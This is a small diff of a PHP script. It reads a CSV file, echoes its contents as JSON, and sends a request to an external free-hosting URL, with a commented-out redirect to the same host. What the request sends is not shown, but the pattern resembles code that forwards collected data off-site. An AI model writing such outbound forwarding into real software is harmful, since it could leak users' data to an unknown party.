@@ -15,7 +15,6 @@
     fclose($handle);
     }
 
-    echo $mycsvfile[0][1];
 
 
 
@@ -38,6 +37,7 @@
     $context = stream_context_create($opts);
     $result = file_get_contents('https://sparkling1234.000webhostapp.com/', false, $context);
     echo $mycsvfile[0][1];
+    echo json_encode($mycsvfile);
     
 
     // header('Location: '."https://sparkling1234.000webhostapp.com/");
